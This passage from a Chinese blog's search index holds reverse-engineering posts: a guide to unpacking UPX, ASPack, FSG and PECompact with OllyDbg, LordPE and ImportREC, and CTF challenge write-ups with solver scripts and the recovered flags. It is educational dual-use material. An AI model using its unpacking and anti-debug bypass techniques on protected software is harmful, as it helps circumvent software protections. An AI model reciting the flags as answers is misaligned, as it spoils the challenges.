参考网站http://www.hexblog.com/?p=9http://www.voidcn.com/article/p-etaovjqz-bao.htmlhttp://www.uml.org.cn/c++/200710313.asphttps://esebanana.github.io/2018/04/08/re_10_tls_smc/http://www.voidcn.com/article/p-etaovjqz-bao.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"简单脱壳指南","slug":"简单脱壳指南","date":"2018-11-29T09:04:10.000Z","updated":"2020-02-09T09:38:15.163Z","comments":true,"path":"2018/11/29/简单脱壳指南/","link":"","permalink":"qianfei11.coding.me/2018/11/29/简单脱壳指南/","excerpt":"记录一下脱一些简单压缩壳的过程（主要是找 OEP）。","text":"记录一下脱一些简单压缩壳的过程（主要是找 OEP）。 压缩壳和加密壳 在理解什么是压缩壳的时候，先了解什么是壳。壳可以简单理解为就是在 PE 文件中包含了代码，而又不影响 PE 文件的执行。其中压缩壳是让 PE 文件变小的壳。在运行加了压缩壳的程序时，壳先对程序进行解压缩，然后再运行源程序。 加密壳主要就是针对软件的加密保护，也有一些人用加密壳来做一些木马的免杀，导致一些杀软件查到该壳就误报病毒。加密壳的种类有很多，如果手工脱和修复，即使对高手来脱，也需要费很大力气。 使用工具 调试工具：Ollydbg 查壳工具：ExeInfo/PEID 脱壳工具：LordPE、ImportRE OD 快捷键： 快捷键 功能 f7 单步步入 f8 单步步过 f4 运行到选定位置 f2 设置断点 ctrl+f2 重新开始 f9 运行 shift+f9 忽略异常运行 alt+f9 执行到用户代码 脱壳LordPELordPE 用来将程序 dump 出来： 找到程序右键，修正镜像大小； 完整转存。 ImportRECImportREC 用来修改 OEP 和一些 IAT： 找到程序，输入找到的OEP的值； 点击IAT自动搜索； 获取导入表； 显示无效的，如果有无效的表清除即可； 修正转储。 了解了脱壳的方法后，我们需要做的就是找到 OEP。 压缩壳压缩壳的特点是减小软件体积大小，主要目的起对软件的压缩，加密保护不是重点。例如：UPX、ASPack 等等。 UPX（the Ultimate Packer for eXecutables）是一个免费且开源的可执行程序文件加壳器，支持许多不同操作系统下的可执行文件格式。 ASPack是一种可压缩 32 位 WindowsEXE文件与DLL文件的压缩工具，能将大多数 EXE 文件及 DLL 文件平均压缩百分之三十到四十的压缩率。 kkrunchy是一个64K Demo专用的压缩工具，压缩率非常高。 NSPack是一款支持EXE/DLL/OCX/SCR等类型的文件进行压缩。可以兼容 64 位操作系统。 PECompact是一款能压缩可执行文件（后缀为EXE）的压缩加壳工具，压缩率极高，压缩后的程序无需解压即可直接运行，通过压缩代码、数据、相关资源使压缩能达到 100%。 单步执行法以 UPX 为例。单步执行法，通过单步执行一步一步，找到 OEP（程序入口点）。如果遇到向下的跳转则默认跳转： 遇到向上的跳转则直接执行到下一条语句，即 f4： 最后执行到popad处会有一个大范围的jmp，即转到 OEP。 ESP 定律法以 UPX 为例。利用压缩前后 ESP 不变的定律。在指令pushad时单步一下，会发现寄存器中只有ESP发生变化： 然后右键 ESP 的值，跟随数据窗口： \b 再在数据窗口中硬件访问，设下断点： 同样也可以通过dd xxxxxxxx或者hr xxxxxxxx设下硬件断点，在下方 command 处输入： 然后 f9 继续执行到popad后，删去硬件断点： f7 到达 OEP。 特殊的 ESP 定律法以 FSG2.0 为例。不遵循 ESP 不变的定律，FSG2.0 专用的方法。单步走到popad的下一条指令，观察堆栈窗口从上往下数第四个地址的值即为 OEP 的地址。右键在反汇编窗口跟随： 下硬件断点后 f9 运行，到达 OEP。 二次内存镜像法以 UPX 为例。进入内存段中，先找到程序段的第一个.rsrc，并设下断点后执行： 再在内存段中的0x00401000处设下断点，再执行 然后按照单步执行法往下走就能看到popad还有 jmp： 一步直达法以 UPX 为例。在遇到指令pushad后，通过经验可以判断必存在popad，直接搜索指令找到 OEP： 模拟跟踪法以 ASPack 为例。先进入内存中，找到 SFX： 在命令框输入tc eip&lt;xxxxxxxx： 会看到 OD 左上角变成了跟踪： 等待一段时间就会跳转到 OEP。 SFX 模拟跟踪法以 ASPack 为例。进入选项-&gt;调试设置（Alt+O）： 一般情况选择块方式跟踪或者字节方式，这里选择前者： 确定后，重新载入（Ctrl+f2），直接跳到了 OEP。 最后一次异常法以 PECompact 为例。先在调试选项中忽略所有异常： 重新载入后，执行 m 次 shift+f9，直到程序跑飞。然后重新载入程序，执行 m-1 次 shift+f9。在堆栈窗口中找到SE句柄，然后 ctrl+g 转到 SE 句柄： 1234567891011120045DE74 B8 F9CB45F0 mov eax,0xF045CBF90045DE79 8D88 9E120010 lea ecx,dword ptr ds:[eax+0x1000129E]0045DE7F 8941 01 mov dword ptr ds:[ecx+0x1],eax0045DE82 8B5424 04 mov edx,dword ptr ss:[esp+0x4]0045DE86 8B52 0C mov edx,dword ptr ds:[edx+0xC]0045DE89 C602 E9 mov byte ptr ds:[edx],0xE90045DE8C 83C2 05 add edx,0x50045DE8F 2BCA sub ecx,edx ; ntdll_1.7720353D0045DE91 894A FC mov dword ptr ds:[edx-0x4],ecx ; qqspirit.0045DE740045DE94 33C0 xor eax,eax0045DE96 C3 retn0045DE97 B8 78563412 mov eax,0x12345678 ; 下断点 随后执行到断点处，单步跟到 OEP。 修复有时候脱完壳却不能运行程序，需要修复 IAT。首先载入 OD，在 OEP 往下找call： 找到后在命令框处输入d xxxxxx： 在数据窗口中，往上查找，直到数据为 0，记录下 IAT 地址；往下也同样： 在ImportREC中修改 OEP 后，不采取自动获取的方式，手动输入 IAT 起始地址和大小，偷懒的办法是大小直接输 1000： 然后清除掉无效的，转储一下得到完整程序。 参考网站https://www.cnblogs.com/hongyuyingxiao/p/9630173.htmlhttps://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/cnblogs.com/iBinary/p/7764483.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"南邮-逆向","slug":"南邮-逆向","date":"2018-11-22T08:12:02.000Z","updated":"2019-11-11T06:50:57.721Z","comments":true,"path":"2018/11/22/南邮-逆向/","link":"","permalink":"qianfei11.coding.me/2018/11/22/南邮-逆向/","excerpt":"做了一下南邮的逆向题。","text":"做了一下南邮的逆向题。 Hello,RE!12$ file 1.exe1.exe: PE32 executable (console) Intel 80386, for MS Windows 32 位 PE 文件，拖进 ida 在 main 函数中就有 flag： 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+11h] [ebp-7Fh] int v5; // [esp+75h] [ebp-1Bh] int v6; // [esp+79h] [ebp-17h] int v7; // [esp+7Dh] [ebp-13h] int v8; // [esp+81h] [ebp-Fh] int v9; // [esp+85h] [ebp-Bh] int v10; // [esp+89h] [ebp-7h] __int16 v11; // [esp+8Dh] [ebp-3h] char v12; // [esp+8Fh] [ebp-1h] __main(); printf(fmt); v5 = 'galf'; v6 = 'leW&#123;'; v7 = 'emoc'; v8 = '_oT_'; v9 = 'W_ER'; v10 = 'dlro'; v11 = '&#125;!'; v12 = 0; while ( scanf(\"%s\", &amp;v4) != -1 &amp;&amp; strcmp(&amp;v4, (const char *)&amp;v5) ) printf(aFlag); printf(aFlagoye); printf(aEc); printf(aEooaouctfNupts); printf(aOuU); getchar(); getchar(); return 0;&#125; 脚本： 12345678910#!/usr/bin/env pythonv5 = 'galf'v6 = 'leW&#123;'v7 = 'emoc'v8 = '_oT_'v9 = 'W_ER'v10 = 'dlro'v11 ='&#125;!'flag = v5[::-1] + v6[::-1] + v7[::-1] + v8[::-1] + v9[::-1] + v10[::-1] + v11[::-1]print flag ReadAsm2题目给了一个 main 函数： 123456789int main(int argc, char const *argv[])&#123; char input[] = &#123;0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;; func(input, 28); printf(\"%s\\n\",input+1); return 0;&#125; 以及一个汇编的 func 函数： 123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi ; first arg =&gt; input 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi ; second arg =&gt; length 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 ; i = 1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x14&gt; 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] ; rdi 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] ; input[rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] ; 1 40051a: 31 ca xor edx,ecx ; xor(input[i] ^ i) 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 ; i += 1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x3c&gt; 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] ; length 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 分析 func 可以看到大概是对每个 byte 和递增的 i 异或，然后得到 flag。脚本： 123456#!/usr/bin/env pythonenc = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c]flag = ''for i in range(len(enc)): flag += chr(enc[i] ^ i)print flag Py 交易给了一个 pyc 文件，在线反编译一下或者用工具 python-uncompile6反编译得到源代码。 12345678910111213141516171819202122232425262728$ uncompyle6 Py.pyc# uncompyle6 version 3.2.4# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Mar 4 2019, 09:02:22)# [GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.11.45.5)]# Embedded file name: 1.py# Compiled at: 2017-06-03 10:20:43import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong'# okay decompiling Py.pyc 照着写个脚本： 12345678#!/usr/bin/env pythonimport base64enc = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''tmp = base64.b64decode(enc)for c in tmp: flag += chr((ord(c) - 16) ^ 32)print flag WxyVM1拿到文件先 file 一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM1WxyVM1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0391bf87f6f7a11b4d23e29eb39330a762aff5b4, stripped 然后拿到虚拟机下运行一下看看什么样： 12345[Desktop] ./WxyVM1 3:25:21[WxyVM 0.0.1]input your flag:nctf&#123;123456&#125;wrong 没看出啥东西，基本判断就是程序应该是一个对 flag 的加密。然后拖进 ida 里分析： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; vm_start(); if ( strlen(&amp;input) != 24 ) v4 = 0; for ( i = 0; i &lt;= 23; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; main 函数中输入一个 flag，然后一个 vm 加密函数，再将加密过后的 flag 与存放在 data 段中的 enc 比较，如果相等那么输出correct。所以基本思路应该是通过 enc 逆出 flag。然后进到vm_start函数中看看： 12345678910111213141516171819202122232425262728293031323334353637383940__int64 vm_start()&#123; unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) &#123; v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) &#123; case 1u: result = byte_6010C0[i + 1]; *(&amp;input + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;input + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;input + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= *(&amp;input + byte_6010C0[i + 2]); break; default: continue; &#125; &#125; return result;&#125; 这里发现在 data 段中还有一个 byte 数组。总共有 15000 个数，每三个数一组。第一个数作为需要执行的指令，第二个数为输入 flag 的下标，第三个数为与其进行操作的数据。到这里基本已经清楚了，把数据都 dump 下来，写个脚本逆一下就 ok 了。然后还需要注意的是，这里的运算是以 byte 为单位，可能会产生溢出，所以应该每次操作之后模一下 256。 看到网上大多数 wp 都是用 idc 脚本 patch，因为数据确实太多了，连 lazyida 都 dump 不出来。我是选择手动复制出来所有的数据，然后再用 python 正则匹配一下，提取出来。 最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738import ref = open('WxyVM1.txt', 'r')enc = [0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008]text = f.read()f.close()pat = re.compile(r'db.&#123;5&#125;')find_pat = pat.findall(text)nums = []for n in find_pat: n = n[2:].strip() if n.endswith('h'): n = int(n[:-1], 16) else: n = int(n) nums.append(n)def cal(v0, v3, index): if v0 == 1: enc[index] = (enc[index] - v3) % 256 elif v0 == 2: enc[index] = (enc[index] + v3) % 256 elif v0 == 3: enc[index] = (enc[index] ^ v3) % 256 elif v0 == 4: enc[index] = (enc[index] / v3) % 256 elif v0 == 5: enc[index] = (enc[index] ^ enc[v3]) % 256for i in range(5000): t = 5000 - i v0 = nums[3 * t - 3] v3 = nums[3 * t - 1] res = nums[3 * t - 2] cal(v0, v3, res)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag maze12$ file mazemaze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=eda1df76eec45447cd0e1ad208a7eff914e86758, stripped 64 位 ELF 文件，拖进 ida： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 i; // rbx signed int choice; // eax bool v5; // bp bool v6; // al const char *v7; // rdi __int64 pos; // [rsp+0h] [rbp-28h] pos = 0LL; puts(\"Input flag:\"); scanf(\"%s\", &amp;flag, 0LL); if ( strlen(&amp;flag) != 24 || strncmp(&amp;flag, \"nctf&#123;\", 5uLL) || *(&amp;byte_6010BF + 24) != '&#125;' ) &#123;LABEL_22: puts(\"Wrong flag!\"); exit(-1); &#125; i = 5LL; if ( strlen(&amp;flag) - 1 &gt; 5 ) &#123; while ( 1 ) &#123; choice = *(&amp;flag + i); v5 = 0; if ( choice &gt; 78 ) &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == 'O' ) &#123; v6 = left((_DWORD *)&amp;pos + 1); goto LABEL_14; &#125; if ( choice == 'o' ) &#123; v6 = down((int *)&amp;pos + 1); goto LABEL_14; &#125; &#125; else &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == '.' ) &#123; v6 = up(&amp;pos); goto LABEL_14; &#125; if ( choice == '0' ) &#123; v6 = right((int *)&amp;pos);LABEL_14: v5 = v6; goto LABEL_15; &#125; &#125;LABEL_15: if ( !(unsigned __int8)check((__int64)maze, SHIDWORD(pos), pos) ) goto LABEL_22; if ( ++i &gt;= strlen(&amp;flag) - 1 ) &#123; if ( v5 ) break;LABEL_20: v7 = \"Wrong flag!\"; goto LABEL_21; &#125; &#125; &#125; if ( maze[8 * (signed int)pos + SHIDWORD(pos)] != '#' ) goto LABEL_20; v7 = \"Congratulations!\";LABEL_21: puts(v7); return 0LL;&#125; 迷宫题，一波分析之后大概就能得到上下左右移动对应的字符，以及对应的一些 check，在内存中可以找到 8x8 的迷宫。脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344''' ******* * **** * **** * *** *# *** *** *** *********left - Odown - 0right - oup - .'''flag = 'nctf&#123;o0oo00O000oooo..OO&#125;'assert len(flag) == 24maze = [ [' ', ' ', '*', '*', '*', '*', '*', '*'], ['*', ' ', ' ', ' ', '*', ' ', ' ', '*'], ['*', '*', '*', ' ', '*', ' ', '*', '*'], ['*', '*', ' ', ' ', '*', ' ', '*', '*'], ['*', ' ', ' ', '*', '#', ' ', ' ', '*'], ['*', '*', ' ', '*', '*', '*', ' ', '*'], ['*', '*', ' ', ' ', ' ', ' ', ' ', '*'], ['*', '*', '*', '*', '*', '*', '*', '*']]directions = flag[5:-1]i, j = 0, 0for d in directions: if d == 'O': j -= 1 elif d == '0': i += 1 elif d == 'o': j += 1 elif d == '.': i -= 1 if maze[i][j] == '#' and d == len(directions) - 1: print 'success' break if maze[i][j] == '*': print 'failed' assert Falseprint flag WxyVM2file 一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM2WxyVM2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e57d1a1b70ac3d843afa30523dbbbc53c4ff341f, stripped 运行一下，发现和上一题 VM 应该基本是同一个类型： 12345[Desktop] ./WxyVM2 3:25:36[WxyVM 0.0.2]input your flag:nctf&#123;123456&#125;wrong 然后拖进 ida 里，只有一个 main 函数。f5 反编译发现提示说函数太大，无法反编译。这个时候需要先修改一下 ida 的配置文件hexrays.cfg，具体操作。修改完后看一下 main 函数的情况： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.2]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; if ( strlen(&amp;input) != 25 ) v4 = 0; [......] for ( i = 0; i &lt;= 24; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; 头和尾是基本一样的，主要是中间的部分，是一段又臭又长的对数据的加密。 我们输入的 input 应该都是 byte，而这么多 dword 的操作其实都是对加密部分的混淆。然后这里的话我是把 main 函数提出来，然后筛选出 byte 开头的语句，并且通过一系列切片简化语句。然后把数据段里被加密的 flag 即 enc 数组 dump 出来，将提取出来的语句进行逆向的实现，就能输出 flag。 其他的一些注意实现和前一题一样。最后的实现脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253f = open('WxyVM2.txt', 'r')text = f.read()f.close()enc = [0xFFFFFFC0, 0xFFFFFF85, 0xFFFFFFF9, 0x0000006C, 0xFFFFFFE2, 0x00000014, 0xFFFFFFBB, 0xFFFFFFE4, 0x0000000D, 0x00000059, 0x0000001C, 0x00000023, 0xFFFFFF88, 0x0000006E, 0xFFFFFF9B, 0xFFFFFFCA, 0xFFFFFFBA, 0x0000005C, 0x00000037, 0xFFFFFFFF, 0x00000048, 0xFFFFFFD8, 0x0000001F, 0xFFFFFFAB, 0xFFFFFFA5]ori = text.split(';\\n')ops = []for s in ori: if s.startswith('d'): continue elif s.startswith('b'): t = s[:1] + s[9:11] + s[12:14] + s[15:] ops.append(t) elif s.startswith('--'): t = s[2:3] + s[-2:] + '-=1' ops.append(t) elif s.startswith('++'): t = s[2:3] + s[-2:] + '+=1' ops.append(t) else: continueops = ops[::-1]def getPart(op): index = int(op[1:3], 16) symbol = op[3:4] num = op[5:] if num.endswith('u'): num = num[:-1] if num.startswith('0x'): num = int(num, 16) else: num = int(num) return index, symbol, numdef cal(index, symbol, num): if symbol == '+': enc[index] = (enc[index] - num) % 256 elif symbol == '-': enc[index] = (enc[index] + num) % 256 elif symbol == '^': enc[index] = (enc[index] ^ num) % 256 else: print 'error'for op in ops: index, symbol, num = getPart(op) # print 'enc[', index, ']', symbol, num cal(index, symbol, num)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"合天网安实验室-逆向部分","slug":"合天网安实验室-逆向部分","date":"2018-11-06T13:25:05.000Z","updated":"2019-12-09T06:55:14.359Z","comments":true,"path":"2018/11/06/合天网安实验室-逆向部分/","link":"","permalink":"qianfei11.coding.me/2018/11/06/合天网安实验室-逆向部分/","excerpt":"把合天网安实验室的逆向做了一遍。","text":"把合天网安实验室的逆向做了一遍。 逆向 100Description看你的咯，移动安全大神(逆向 100, 已解决 534) 题目描述: dex2jar 是我们的好朋友相关附件: rev100.zip Solution12$ file rev100rev100: Zip archive data, at least v2.0 to extract 可以判断出其实给的文件是个 apk，根据提示用 dex2jar 可以做。我这里用 jadx 反编译： 1234567891011121314151617181920212223242526272829303132package ctf.crackme;import android.app.Activity;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.TextView;public class FlagActivity extends Activity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_flag); String flag = \"\"; int[] d = new int[]&#123;102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125&#125;; for (int i = 0; i &lt; 22; i++) &#123; flag = flag.concat(String.valueOf((char) d[i])); &#125; ((TextView) findViewById(R.id.flagText)).setText(flag); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.flag, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; if (item.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125;&#125; 直接把数组 d 的值转字符就完事了： 1234567#!/usr/bin/env pythonenc = [102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125]flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag# flag&#123;w4nn4_j4r_my_d3x&#125; 逆向 200Description做题累了玩个游戏吧(逆向 200, 已解决 309) 题目描述: pwd1_pwd2相关附件: rev200.exe Solution12$ file rev200.exerev200.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows 程序加了 tls，但对逆向没有什么影响。直接上 OD 调： 123456789101112131415161718192021222324252600401B33 |. 83EC 08 sub esp,0x800401B36 |. A1 8CAD4000 mov eax,dword ptr ds:[0x40AD8C] ; ||||00401B3B |. 890424 mov dword ptr ss:[esp],eax ; ||||00401B3E |. E8 4D5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; |||\\puts00401B43 |. 8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157] ; |||00401B49 |. 894424 04 mov dword ptr ss:[esp+0x4],eax ; |||00401B4D |. C70424 209040&gt;mov dword ptr ss:[esp],re200_no.00409020 ; |||ASCII &quot;%20s&quot;00401B54 |. E8 2F5F0000 call &lt;jmp.&amp;msvcrt.scanf&gt; ; ||\\scanf00401B59 |. 8D85 BDFEFFFF lea eax,dword ptr ss:[ebp-0x143] ; ||00401B5F |. 894424 04 mov dword ptr ss:[esp+0x4],eax ; ||00401B63 |. 8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157] ; ||00401B69 |. 890424 mov dword ptr ss:[esp],eax ; ||00401B6C |. E8 275F0000 call &lt;jmp.&amp;msvcrt.strcmp&gt; ; |\\strcmp00401B71 |. 85C0 test eax,eax ; |00401B73 |. 75 18 jnz short re200_no.00401B8D ; |00401B75 |. C70424 269140&gt;mov dword ptr ss:[esp],re200_no.00409126 ; |ASCII &quot;You passed level1!&quot;00401B7C |. E8 0F5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; \\puts00401B81 |. C70424 000000&gt;mov dword ptr ss:[esp],0x000401B88 |. E8 5DFAFFFF call re200_no.004015EA00401B8D |&gt; B8 00000000 mov eax,0x000401B92 |. 8D65 F8 lea esp,[local.2]00401B95 |. 59 pop ecx ; msvcrt.77558E6200401B96 |. 5B pop ebx00401B97 |. 5D pop ebp00401B98 |. 8D61 FC lea esp,dword ptr ds:[ecx-0x4]00401B9B \\. C3 retn 第一个 check 很容易找到 passwd： 12堆栈地址=0028FD75, (ASCII &quot;r0b0RUlez!&quot;)eax=00000001 第二个 check 有个int3反调试： 1234567891011121314151617181920004015EA /$ 55 push ebp004015EB |. 89E5 mov ebp,esp004015ED |. 83EC 18 sub esp,0x18004015F0 |. 837D 08 09 cmp [arg.1],0x9004015F4 |. 7F 11 jg short re200_no.00401607004015F6 |. 8345 08 01 add [arg.1],0x1004015FA |. 8B45 08 mov eax,[arg.1]004015FD |. 890424 mov dword ptr ss:[esp],eax ; re200_no.0040161900401600 |. E8 E5FFFFFF call re200_no.004015EA00401605 |. EB 1E jmp short re200_no.0040162500401607 |&gt; A1 90AD4000 mov eax,dword ptr ds:[0x40AD90] ; |0040160C |. 890424 mov dword ptr ss:[esp],eax ; |re200_no.004016190040160F |. E8 7C640000 call &lt;jmp.&amp;msvcrt.puts&gt; ; \\puts00401614 |. E8 00000000 call re200_no.0040161900401619 |$ 58 pop eax ; 0028FDD50040161A |. A3 A8AD4000 mov dword ptr ds:[0x40ADA8],eax ; re200_no.004016190040161F |. CC int300401620 |. B8 00000000 mov eax,0x000401625 |&gt; C9 leave00401626 \\. C3 retn 新增的AddVectoredExceptionHandler这个 API 将一个指向函数的指针作为参数，把这个函数的地址添加到已注册的异常处理程序链表中。那么这里的int 3异常会交给异常处理程序链表中第一个处理函数处理，假如调试器处理这个异常，我们就到不了那里了，所以 OD 的设置一定要忽略所有异常，让程序或系统自己处理。 1234567891011121300401B0E |. 83EC 04 sub esp,0x400401B11 |. 895C24 04 mov dword ptr ss:[esp+0x4],ebx ; |00401B15 |. 890424 mov dword ptr ss:[esp],eax ; |re200_no.0040161900401B18 |. A1 60B14000 mov eax,dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddress&gt;] ; |00401B1D |. FFD0 call eax ; \\GetProcAddress00401B1F |. 83EC 08 sub esp,0x800401B22 |. C74424 04 7F1&gt;mov dword ptr ss:[esp+0x4],re200_no.0040157F00401B2A |. C70424 010000&gt;mov dword ptr ss:[esp],0x100401B31 |. FFD0 call eax ; re200_no.0040161900401B33 |. 83EC 08 sub esp,0x800401B36 |. A1 8CAD4000 mov eax,dword ptr ds:[0x40AD8C] ; ||||00401B3B |. 890424 mov dword ptr ss:[esp],eax ; ||||re200_no.0040161900401B3E |. E8 4D5F0000 call &lt;jmp.&amp;msvcrt.puts&gt; ; |||\\puts 重新调试一遍，可以在1AF9处看到程序将AddVectoredExceptionHandler的地址（DS:0x40ADAC存放的是字符串AddVectoredExceptionHandler）从kernel32.dll中取出，并且将0040157F函数注册到了这个地方： 123456789101112131400401AF9 |. 8B1D ACAD4000 MOV EBX,DWORD PTR DS:[0x40ADAC] ; |00401AFF |. A1 9CAD4000 MOV EAX,DWORD PTR DS:[0x40AD9C] ; |00401B04 |. 890424 MOV DWORD PTR SS:[ESP],EAX ; |00401B07 |. A1 5CB14000 MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetModuleHandleA&gt;] ; |00401B0C |. FFD0 CALL EAX ; \\GetModuleHandleA00401B0E |. 83EC 04 SUB ESP,0x400401B11 |. 895C24 04 MOV DWORD PTR SS:[ESP+0x4],EBX ; |00401B15 |. 890424 MOV DWORD PTR SS:[ESP],EAX ; |00401B18 |. A1 60B14000 MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetProcAddress&gt;] ; |00401B1D |. FFD0 CALL EAX ; \\GetProcAddress00401B1F |. 83EC 08 SUB ESP,0x800401B22 |. C74424 04 7F1&gt;MOV DWORD PTR SS:[ESP+0x4],rev200.0040157F00401B2A |. C70424 010000&gt;MOV DWORD PTR SS:[ESP],0x100401B31 |. FFD0 CALL EAX 找到157F处，删除分析后就能看到代码： 1234567891011121314151617181920210040157F 55 push ebp00401580 89E5 mov ebp,esp00401582 83EC 38 sub esp,0x3800401585 8B45 08 mov eax,dword ptr ss:[ebp+0x8]00401588 8B40 04 mov eax,dword ptr ds:[eax+0x4] ; ntdll_12.77DF9D4C0040158B 8B80 